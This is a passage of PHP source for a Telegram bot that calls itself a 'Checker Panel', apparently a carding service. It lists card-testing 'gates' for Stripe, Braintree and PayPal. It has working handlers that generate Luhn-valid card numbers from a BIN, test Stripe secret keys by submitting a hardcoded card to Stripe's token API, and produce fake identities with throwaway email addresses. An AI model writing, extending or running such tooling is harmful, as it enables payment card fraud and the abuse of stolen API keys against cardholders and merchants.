sendMessage($chat_id,$respuesta,$message_id);
die();
}
}

}else{
$respuesta = "❌ Unban: $chat_id) ($id) Función no disponible para usuarios Free!\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}


if($users[$id]['registered'] != true){
        $users[$id] = array('registered' => true, 'msgs' => 0, 'date' => $date, 'banned' => false);
    $users = json_encode($users);
    file_put_contents($fn, $users);
    $users = json_decode($users, true);
}

if($users[$id]['banned'] == true){
$respuesta = "❌ Estas baneado!\n";
sendMessage($chat_id,$respuesta,$message_id);
    fclose($fp);
    exit();
}
*/
/*
$date = time();
//---------------------
$users[$id]['msgs'] = $users[$id]['msgs'] + 1;
$users = json_encode($users);
file_put_contents($fn, $users);
$users = json_decode($users, true);

if($date <= $users[$id]['date'] + 30 and $users[$id]['msgs'] >= 3){
$respuesta = "[ANTI SPAM] Try again after 30s\n";
//echo "$respuesta";
sendMessage($chat_id,$respuesta,$message_id);
    exit();
}
if($date > $users[$id]['date'] + 30){
        $users[$id]['date'] = $date;
    $users[$id]['msgs'] = 0;
    $users = json_encode($users);
        file_put_contents($fn, $users);
    $users = json_decode($users, true);
}

//echo "Puedes enviar mensajes\n";
//sendMessage($id, "Ciao!");
fclose($fp);
*/
/*
$date = time();
static $users = array();

if (!isset($users[$id])) {
    $users[$id] = ['date' => 0, 'msgs' => 0];
}

$users[$id]['msgs']++;
$users[$id]['date'] = $date;

if ($date <= $users[$id]['date'] + 30 && $users[$id]['msgs'] >= 3) {
    $respuesta = "[ANTI SPAM] Try again after 30s\n";
    sendMessage($chat_id, $respuesta, $message_id);
    exit();
}

if ($date > $users[$id]['date'] + 30) {
    $users[$id]['date'] = $date;
    $users[$id]['msgs'] = 0;
}*/



//Almacenar los tiempos de mensajes en la sesión
//Almacenar los tiempos de mensajes en la sesión
if (!isset($_SESSION['message_times'])) {
    $_SESSION['message_times'] = [];
}

// Obtener actualizaciones

//if (isset($upda['message'])) {
  //  $chat_id = $json['message']['chat']['id'];

    // Inicializar el registro de mensajes para el usuario si no existe
    if (!isset($_SESSION['message_times'][$chat_id])) {
        $_SESSION['message_times'][$chat_id] = [];
    }

    // Filtrar mensajes antiguos (más de 30 segundos)
    $_SESSION['message_times'][$chat_id] = array_filter(
        $_SESSION['message_times'][$chat_id],
        function ($timestamp) {
            return time() - $timestamp < 30; // Mantener solo los mensajes dentro de los últimos 30 segundos
        }
    );

    // Verificar cuántos mensajes ha enviado el usuario en los últimos 30 segundos
    if (count($_SESSION['message_times'][$chat_id]) >= 2) {
       $respuesta = "⏳ Has alcanzado el límite de mensajes. Espera 30 segundos antes de enviar más.";
       sendMessage($chat_id,$respuesta,$message_id);
//       echo "$respuesta\n";
      return;
    }

    // Agregar el nuevo mensaje a la lista de tiempos
    $_SESSION['message_times'][$chat_id][] = time();

    // Responder al mensaje del usuario
//    $respuesta = "😊 Tu mensaje ha sido recibido.";
//    sendMessage($chat_id,$respuesta,$message_id);
//}







//-----BIENVENIDA NUEVO INTEGRANTE------//

//$data = json_decode($json, true);
$data = $upda;

if (isset($data['message']['new_chat_participant']) ||
    isset($data['message']['new_chat_member']) ||
    isset($data['message']['new_chat_members'])) {

    // Un nuevo usuario se ha unido al grupo
    $new_user_id = $data['message']['new_chat_participant']['id'] ??
                   $data['message']['new_chat_member']['id'] ??
                   $data['message']['new_chat_members'][0]['id'];

    $new_user_name = $data['message']['new_chat_participant']['first_name'] ??
                     $data['message']['new_chat_member']['first_name'] ??
                     $data['message']['new_chat_members'][0]['first_name'];

    $new_username = $data['message']['new_chat_participant']['username'] ??
                    $data['message']['new_chat_member']['username'] ??
                    $data['message']['new_chat_members'][0]['username'];
	
    $chat_title = $data['message']['chat']['title'];


//$chat_id = 1292171163; // Reemplaza con el ID del chat donde quieres enviar la foto
$photoID = 'AgACAgEAAxkBAAI1-GcyYUp-dDkeJgZASNIMKESwTVr3AAJ9rTEbRFOYRa60ta4yFkQsAQADAgADcwADNgQ';
$message_id = isset($update['message_id']) ? $update['message_id'] : null; // Obtén el ID del mensaje actual si existe
	
$respuesta =  "¡Hola $new_user_name! Bienvenido/a al Chat de $chat_title.\n\n‣ ᴜsᴇʀ ɪᴅ: <code>$new_user_id</code>\n‣ ғᴜʟʟ ɴᴀᴍᴇ: $new_user_name\n‣ ᴜsᴇʀɴᴀᴍᴇ: @$new_username\n‣ ᴜsᴇʀ ᴛʏᴘᴇ: $tipo\n\nDisfruta de nuestra comunidad y recuerda respetar las reglas para asegurar una experiencia óptima.\n";
sendPhoto($chat_id, $photoID, $respuesta, $message_id);
//sendMessage($chat_id,$respuesta,$message_id);

} elseif (isset($data['message']['left_chat_participant']) ||
          isset($data['message']['left_chat_member'])) {
    // Una persona ha salido del grupo
    $left_user_id = $data['message']['left_chat_participant']['id'] ??
                    $data['message']['left_chat_member']['id'];

    $left_user_name = $data['message']['left_chat_participant']['first_name'] ??
                      $data['message']['left_chat_member']['first_name'];

    $left_username = $data['message']['left_chat_participant']['username'] ??
                      $data['message']['left_chat_member']['username'];


$respuesta =  "¡Hasta luego $left_user_name, nadie te extrañara!\n\n‣ ᴜsᴇʀ ɪᴅ: <code>$left_user_id</code>\n‣ ғᴜʟʟ ɴᴀᴍᴇ: $left_user_name\n‣ ᴜsᴇʀɴᴀᴍᴇ: @$left_username\n";
sendMessage($chat_id,$respuesta,$message_id);
} else {
    // No es un evento de entrada o salida
}



// Start Commands
if (strpos($message, ".start") === 0 || strpos($message, "!start") === 0 || strpos($message, "/start") === 0) {
$respuesta = "─ Checker Panel ─\n\n⁕ Registered as ➞ ".$admin."\n⁕ Use ➞ ".$update["chat"]["type"]." | ".$message1["chat"]["type"]." /cmds to show available commands.\n⁕ Bot by: $admin\n";
sendMessage($chat_id,$respuesta,$message_id);
}
// Cmds Commands
elseif((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)||(strpos($message, ".cmds") === 0)) {
        $respuesta = "━━━━•⟮ ᴄʜᴇᴄᴋᴇʀ ᴄᴏᴍᴍᴀɴᴅs ⟯•━━━━\n\n➩ Check User Info ✔\n⁕ Usage: /me\n➩ Check ID chat ✔\n⁕ Usage: /id\n➩ List Command Gates ✔\n⁕ Usage: /gts\n\n◤━━━━━ ☆. 𝙴𝚇𝚃𝚁𝙰𝚂 .☆ ━━━━━◥\n\n⌦ Bin Check ➟ !bin ✔\n⁕ Usage: !bin xxxxxx\n⌦ Checker IBAN ➟ !iban ✔\n⁕ Usage: !iban xxxxxx\n⌦ SK Key Check ➟ !ks ✔\n⁕ Usage: !ks ks_live_xxxx\n⌦ GEN ➟ !gen ✔\n⁕ Usage: !gen xxxxxx\n\n◤━━ ☆. 𝙴𝚇𝚃𝚁𝙰𝙿𝙾𝙻𝙰𝙲𝙸𝙾𝙽 .☆ ━━◥\n\n° ᭄ Basica ➟ /extb ✔\n⁕ Usage: !extb ᴄᴄs1\n° ᭄ Similitud ➟ /exts ✔\n⁕ Usage: !extb ᴄᴄs1-ᴄᴄs2\n° ᭄ Avanzada ➟ /exta ✔\n⁕ Usage: !extb ᴄᴄs1-ᴄᴄs2\n° ᭄ Indentacion ➟ /exti ✔\n⁕ Usage: !extb ᴄᴄs1\n ᭄ Sophia ➟ /extm ✔\n⁕ Usage: !extb ᴄᴄs1-ᴄᴄs2\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        sendMessage($chat_id,$respuesta,$message_id);
}                                                                     

elseif((strpos($message, "!gts") === 0)||(strpos($message, "/gts") === 0)||(strpos($message, ".gts") === 0)) {
        $respuesta = "━━━━•⟮ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗚𝗮𝘁𝗲𝘀 ⟯•━━━━\n\n➩ Gates Chargeds ✔\n⁕ Usage: /chds\n➩ Gates Auth ✔\n⁕ Usage: /ats\n➩ Gates PayPal ✔\n⁕ Usage: /pys\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        sendMessage($chat_id,$respuesta,$message_id);
}

elseif((strpos($message, "!chds") === 0)||(strpos($message, "/chds") === 0)||(strpos($message, ".chds") === 0)) {
//      $respuesta = "\n◤━━━ ☆ 𝙶𝙰𝚃𝙴𝚂 𝙲𝙷𝙰𝚁𝙶𝙴𝙳𝚂 ☆ ━━━◥\n\n🔥 Stripe ($50) ✔\n➣ Checker ➟ !stp\n⁕ Usage: !stp ccs|month|year|cvv\n\n🔥 Charged ($20) ✔\n➣ Checker ➟ !pa\n⁕ Usage: !pa ccs|month|year|cvv\n\n🔥 Charged ($5) ✔\n➣ Checker ➟ !ch\n⁕ Usage: !ch ccs|month|year|cvv\n\n🔥 Charged ($10) ✔\n➣ Checker ➟ !fa\n⁕ Usage: !fa ccs|month|year|cvv\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Chargeds\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Stripe ($50) ✔\n➣ Command ➟ /stp\n⁕ Status: ON!✅\n\n🔥 Charged ($5) ✔\n➣ Command ➟ /go\n⁕ Status: ON!✅\n\n🔥 Charged ($20) ✔\n➣ Command ➟ /pa\n⁕ Status: ON! ✅\n\n🔥 Command ($5) ✔\n➣ Checker ➟ /ch\n⁕ Status: ON!✅\n\n🔥 Carged ($10) ✔\n➣ Command ➟ /fa\n⁕ Status: OFF!❌\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        sendMessage($chat_id,$respuesta,$message_id);
}

elseif((strpos($message, "!ats") === 0)||(strpos($message, "/ats") === 0)||(strpos($message, ".ats") === 0)) {
        //$respuesta = "\n◤━━━━━ ☆ 𝙶𝙰𝚃𝙴𝚂 𝙰𝚄𝚃𝙷 ☆ ━━━━━◥\n\n🔥 Stripe Auth 3DS ✔\n➣ Checker ➟ !he\n⁕ Usage: !he ccs|month|year|cvv\n\n🔥 Stripe Auth ✔\n➣ Checker ➟ !ho\n⁕ Usage: !ho ccs|month|year|cvv\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Auth\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Braintree CCN_V3 ✔\n➣ Command ➟ /he\n⁕ Status: ON!✅\n\n🔥 Braintree Auth ✔\n➣ Command ➟ /ho\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        sendMessage($chat_id,$respuesta,$message_id);
}


elseif((strpos($message, "!pys") === 0)||(strpos($message, "/pys") === 0)||(strpos($message, ".pys") === 0)) {
        //$respuesta = "\n◤━━━━ ☆ 𝙶𝙰𝚃𝙴𝚂 𝙿𝚊𝚢𝙿𝚊𝚕 ☆ ━━━━◥\n\n🔥 Paypal ✔\n➣ Checker ➟ !pp\n⁕ Usage: !pp ccs|month|year|cvv\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates PayPal\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Paypal ✔\n➣ Command ➟ /pp\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        sendMessage($chat_id,$respuesta,$message_id);
}

elseif((strpos($message, "!me") === 0)||(strpos($message, "/me") === 0)||(strpos($message, ".me") === 0))
{
	$respuesta = "[ ↯ ] ᴍʏ ᴀʙᴏᴜᴛ [ ↯ ]\n\n‣ ᴜsᴇʀ ɪᴅ:".$id."\n‣ ғᴜʟʟ ɴᴀᴍᴇ: ".$Name." ".$last."\n‣ ᴜsᴇʀɴᴀᴍᴇ: @".$user."\n‣ ᴜsᴇʀ ᴛʏᴘᴇ: ".$tipo."\n";
//$respuesta = "⁕ ─ 𝑈𝑆𝐸𝑅 𝐼𝑁𝐹𝑂 ─ ⁕\n➩ 𝚄𝚂𝙴𝚁 𝙸𝙳: <code>".$id."</code>\n➩ 𝙵𝚄𝙻𝙻 𝙽𝙰𝙼𝙴: ".$Name." ".$last."\n➩ 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴: @".$user."\n➩ 𝚄𝚂𝙴𝚁 𝚃𝚈𝙿𝙴: ".$tipo."\n";
	$respuesta = "     [ ↯ ] ᴍʏ ᴀʙᴏᴜᴛ [ ↯ ]\n\n‣ ᴜsᴇʀ ɪᴅ: <code>".$id."</code>\n‣ ғᴜʟʟ ɴᴀᴍᴇ: ".$Name." ".$last."\n‣ ᴜsᴇʀɴᴀᴍᴇ: @".$user."\n‣ ᴜsᴇʀ ᴛʏᴘᴇ: ".$tipo."\n";
	sendMessage($chat_id,$respuesta,$message_id);
}
//--------------------------END INFO-------------------------//


elseif((strpos($message, "!gen") === 0)||(strpos($message, "/gen") === 0)||(strpos($message, ".gen") === 0)){
$si = substr($message, 5);

if($si != ''){
}else{
$respuesta = "━━━━━━━•⟮ɢᴇɴ ᴄᴄs⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /gen xxxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !gen xxxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .gen xxxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$lista = substr($message, 5);
$target = substr($lista, 0,2);

$bin = explode("|", $lista)[0];
$mes1 = explode("|", $lista)[1];
$ano1 = explode("|", $lista)[2];
$cvv1 = explode("|", $lista)[3];
$d4 = "".$bin."xxxxxxxxxxxxxxxxx";

if ($target == "37" || $target == "34"){
        $bin = substr($d4, 0, 14);
        $cant = "15";

}else{
        $bin = substr($d4, 0, 15);
        $cant = "16";
}
	
$Bin = substr($bin, 0, 6);
$amount = "10";

if (empty($mes1)){
$mes1="rnd";
}
if (empty($ano1)){
$ano1="rnd";
}
if (empty($cvv1)){
$cvv1="rnd";
}
sleep(1);


for ($i=$amount;$i>-0;$i--){

//-------GERADOR DE MES - AÑO - CCV -------//
        $randMonth = rand(1, 12);
        $randYears = rand(25, 30);
if ($target == "37" || $target == "34"){
        $randCvv = rand(1000, 9999);
}else{
        $randCvv = rand(100, 999);
}
        $randMonth < 10 ? $randMonth = "0" . $randMonth : $randMonth = $randMonth;
        $randCvv < 100 ? $randCvv = "0" . $randCvv : $randCvv = $randCvv;
        $fecha = "|".$randMonth."|20".$randYears."|".$randCvv;

//-----GENERADOR DE CC------//
if(is_numeric($mes1)){
$mes = $mes1;
}else{
$mes = $randMonth;
}
if(is_numeric($ano1)){
$ano = $ano1;
}else{
$ano = "20$randYears";
}
if(is_numeric($cvv1)){
$cvv = $cvv1;
}else{
$cvv = $randCvv;
}
$data = "|$mes|$ano|$cvv";
            $ccNumber = $bin;
            while (strlen($ccNumber) < ($cant - 1)) {
                $ccNumber .= rand(0, 9);
            }
            $ccNumber = str_split($ccNumber);
            $replace = "";
            foreach ($ccNumber as $cc => $key) {
            $replace .= str_replace("x", rand(0, 9), $key);
            }

$ccs = Calculate($replace, $cant);
$cards = $ccs.$data;
$data = "<code>".$cards."</code>";

$da = "".$data."\n";
        $archivo = fopen("cc-gen","a");
        fwrite($archivo,$da);
        fclose($archivo);
        }

        $ccs = file_get_contents("cc-gen");

$Bin_Gen = Bin_Gen_Info($Bin); //
$Bin = "<code>$Bin</code>";
$respuesta = "➭ 𝙱𝙸𝙽: $Bin\n➭ 𝙰𝙼𝙾𝚄𝙽𝚃: 10\n\n$ccs\n".$Bin_Gen."";


//$respuesta = "➭ 𝙱𝙸𝙽: $Bin\n➭ 𝙰𝙼𝙾𝚄𝙽𝚃: 10\n\n$ccs\n➭ 𝙱𝙸𝙽 𝙸𝙽𝙵𝙾: $brand - $type - $level\n➭ 𝙱𝙰𝙽𝙺: $bank\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: $count\n";
editMessage($chat_id,$respuesta,$id_text);
unlink("cc-gen");
die();
}





elseif((strpos($message, "!fake") === 0)||(strpos($message, "/fake") === 0)||(strpos($message, ".fake") === 0)){

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//

$startTime = microtime(true); //TIEMPO DE INICIO
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$get = curl_exec($ch);
curl_close($ch);
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = ucfirst($matches1[1][0]);
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = ucfirst($matches1[1][0]);
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = ucfirst($matches1[1][0]);
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = ucfirst($matches1[1][0]);
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = ucfirst($matches1[1][0]);
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
//---------------------------////---------------------------//
$response = file_get_contents('https://www.fakemailgenerator.com');
preg_match('/value="([^"]+)"/', $response, $matches);
$GmailUser = $matches[1];
//---------------------------//
// Extraer el valor del dominio
preg_match('/<span id="domain">([^<]+)<\/span>/', $response, $matches);
$dominio = trim($matches[1]);
// Eliminar espacios en blanco
//---------------------------//
$usr = str_replace("@", "", $dominio);
//---------------------------//
$email = "$GmailUser$dominio";
$link = "https://www.fakemailgenerator.com/#/$usr/$GmailUser/";

$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '',4);
$respuesta = "━━━━━━•⟮ғᴀᴋᴇ ᴜsᴇʀ⟯•━━━━━━\n➭ 𝙽𝙰𝙼𝙴: <code>".$name."</code>\n➭ 𝙻𝙰𝚂𝚃 𝙽𝙰𝙼𝙴: <code>".$last."</code>\n➭ 𝙴𝙼𝙰𝙸𝙻: <code>".$email."</code> <a href='".$link."'>(ᴏᴘᴇɴ ʟɪɴᴋ)</a>\n➭ 𝚂𝚃𝚁𝙴𝙴𝚃: <code>".$street."</code>\n➭ 𝙲𝙸𝚃𝚈: <code>".$city."</code>\n➭ 𝚂𝚃𝙰𝚃𝙴: <code>".$state."</code>\n➭ 𝙿𝙷𝙾𝙽𝙴: <code>".$phone."</code>\n➭ 𝙿𝙾𝚂𝚃 𝙲𝙾𝙳𝙴: <code>".$postcode."</code>\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝚄𝚂𝙴𝚁: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: $admin\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);

}


elseif((strpos($message, "!ks") === 0)||(strpos($message, "/ks") === 0)||(strpos($message, ".ks") === 0)){
$si = substr($message, 4);
$key = substr($message, 4);

if(preg_match_all("/sk_(test|live)_[A-Za-z0-9]+/", $key, $matches)) {
$sk = $matches[0][0];
}



if ($si != '' && $sk != '' ){
}else{
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ks sk_live_xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .ks sk_live_xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !ks sk_live_xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


// Bonus: SK Key Checker
$skhiden = substr_replace($sk, '',12).preg_replace("/(?!^).(?!$)/", "*", substr($sk, 12));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5278540001668044&card[exp_month]=10&card[exp_year]=2024&card[cvc]=252");
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);

$message = trim(strip_tags(getStr($result,'"message":"','.')));
if (empty($message)) {
$message = 'Charge Found';
}

if (strpos($result, 'api_key_expired')){
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK EXPIRED ❌\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: Expired API key Provided.\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
elseif (strpos($result, 'Invalid API Key provided')){
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK INVALID ❌\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: Invalid API Key Provided.\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
elseif ((strpos($result, 'You did not provide an API key.')) || (strpos($result, 'You need to provide your API key in the Authorization header,'))){
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK DEAD ❌\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: You did not provide an API key.\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK DEAD ❌\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: Your account cannot currently make live charges.\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}else{
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK LIVE ✅\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: ".$message.".\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
}



elseif((strpos($message, "!iban") === 0)||(strpos($message, "/iban") === 0)||(strpos($message, ".iban") === 0)){
$si = substr($message, 6);

if (is_numeric($si) && ($si != '')){
}else{
$respuesta = "━━━━━━━•⟮ɪʙᴀɴ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /iban xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !iban xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .iban xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


//$message = "/iban 4520880028518536|03|2023|854";
$ibanx = substr($message, 6);
$iban = substr($ibanx, 0, 6);
$startTime = microtime(true); //TIEMPO DE INICIO
$curl = curl_init('https://openiban.com/validate/'.$iban.'?validateBankCode=true&getBIC=true');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
curl_close($curl);

$bankcode1 = capture($content, '"bankCode": "', '"');
$bankname = capture($content, '"name": "', '"');
$zip = capture($content, '"zip": "', '"');
$city = capture($content, '"city": "', '"');
$bic = capture($content, '"bic": "', '"');
$timetakeen = (microtime(true) - $startTime);
$timetaken = substr_replace($timetakeen, '',4);

if(strpos($content, 'valid": true')){
$respuesta = "IBAN -LIVE ✅ $iban\nBIC: $bic\nBank Code: $bankcode1\nBank: $bankname\nCity: $city\nTime: $timetaken's\n━━━━━━━━━━━━━";
editMessage($chat_id,$respuesta,$id_text);
}
elseif(strpos($content, 'valid": false')){
$respuesta = "IBAN - DEAD ❌ $iban\nTime: $timetaken's";
editMessage($chat_id,$respuesta,$id_text);
}

}



elseif((strpos($message, "!bin") === 0)||(strpos($message, "/bin") === 0)||(strpos($message, ".bin") === 0)){
$si = substr($message, 5);

if (is_numeric($si) && ($si != '')){
}else{
$respuesta = "━━━━━━━•⟮ʙɪɴ ɪɴғᴏ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /bin xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !bin xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .bin xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$bin = substr($message, 5);
$bin = substr("$bin", 0, 6);
$startTime = microtime(true); //TIEMPO DE INICIO


//Extrae la información del bin///
$bin_info = Bininfo($bin);
